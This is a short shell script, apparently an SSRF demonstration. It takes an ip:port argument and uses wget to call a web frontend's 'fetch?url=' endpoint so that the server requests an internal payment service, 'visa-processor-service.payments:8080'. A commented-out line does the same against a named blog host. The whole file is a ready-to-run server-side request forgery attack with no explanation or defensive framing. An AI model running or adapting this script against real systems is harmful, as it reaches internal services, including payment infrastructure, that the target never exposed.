if [ $# -eq 0 ]
then
echo  "try: ./$0 ip:port"
exit 1
fi

#wget -q -O - http://blog-frontend.apps.ocp.ralvares.com/fetch?url=http://checkip.dyndns.com
wget -q -O - http://$1/fetch?url=http://visa-processor-service.payments:8080
